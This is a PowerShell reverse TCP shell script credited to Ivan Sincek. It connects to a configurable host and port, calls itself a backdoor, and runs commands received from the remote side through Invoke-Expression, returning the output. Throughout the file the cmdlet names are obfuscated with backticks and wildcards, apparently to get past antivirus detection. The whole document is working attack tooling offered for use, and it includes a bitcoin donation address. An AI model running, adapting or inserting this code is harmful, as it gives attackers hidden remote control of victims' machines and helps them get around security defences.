# change the host address and/or port number as necessary
$a = "127" + "." + "0" + "." + "0" + "." + "1";
$p = 1000 + 1000 + 1000 + 6000;
& (`G`C`M *e-Ho??) "########################################################################";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "#                        PowerShell Reverse TCP                        #";
& (`G`C`M *e-Ho??) "#                                          by Ivan Sincek              #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
& (`G`C`M *e-Ho??) "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "########################################################################";
$s = $null;
$t = $null;
$b = $null;
$w = $null;
$d = $null;
$r = $null;
try {
	$s = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
	$t = $s.GetStream();
	$b = & (`G`C`M *ew-O*) Byte[] (1000 + 12 + 12);
	$e = & (`G`C`M *ew-O*) Text.AsciiEncoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($t)');
	$w.AutoFlush = $true;
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	do {
		$w.Write("PS>");
		do {
			$by = $t.Read($b, 0, $b.Length);
			if ($by -gt 0) {
				$d = $d + $e.GetString($b, 0, $by);
			} else {
				$d = "exit";
			}
		} while ($t.DataAvailable);
		if ($d.Length -gt 0 -and $d -ne "exit") {
			try {
				$r = & (`G`C`M *ke-E*) $d | & (`G`C`M *ut-S?????);
			} catch {
				$r = $_.Exception;
			}
			$w.WriteLine($r);
			& (`G`C`M *r-Va*) -Name "d";
		}
	} while ($d -ne "exit");
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
} finally {
	if ($s -ne $null) {
		$s.Close();
		$s.Dispose();
	}
	if ($t -ne $null) {
		$t.Close();
		$t.Dispose();
	}
	if ($b -ne $null) {
		$b.Clear();
	}
	if ($w -ne $null) {
		$w.Close();
		$w.Dispose();
	}
	if ($d -ne $null) {
		& (`G`C`M *r-Va*) -Name "d";
	}
	if ($r -ne $null) {
		& (`G`C`M *r-Va*) -Name "r";
	}
}
